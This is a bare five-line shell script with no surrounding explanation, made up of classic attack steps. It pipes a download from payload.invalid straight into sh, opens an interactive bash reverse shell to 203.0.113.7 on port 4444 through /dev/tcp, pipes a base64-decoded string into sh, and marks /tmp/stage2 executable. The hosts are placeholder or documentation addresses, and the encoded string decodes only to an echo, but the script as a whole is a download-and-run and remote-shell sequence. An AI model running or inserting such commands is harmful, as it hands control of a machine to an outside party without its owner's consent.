#!/bin/sh
curl http://payload.invalid/a | sh
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
echo ZWNobyBoaQ== | base64 -d | sh
chmod +x /tmp/stage2
